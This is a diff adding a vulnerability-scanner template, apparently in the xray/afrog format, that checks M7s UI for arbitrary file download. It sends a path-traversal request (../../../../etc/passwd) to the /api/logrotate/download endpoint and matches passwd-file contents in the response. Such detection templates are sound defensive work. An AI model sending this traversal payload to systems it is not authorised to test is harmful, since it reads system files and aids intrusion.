@@ -1,0 +1,18 @@
+id: m7s-download-fileread
+
+info:
+  name: m7s download fileread
+  author: qwtd
+  severity: high
+  verified: true
+  description: |
+    M7s UI download接口存在任意文件下载漏洞
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /api/logrotate/download?file=../../../../../../../etc/passwd
+      follow_redirects: true
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+expression: r0()
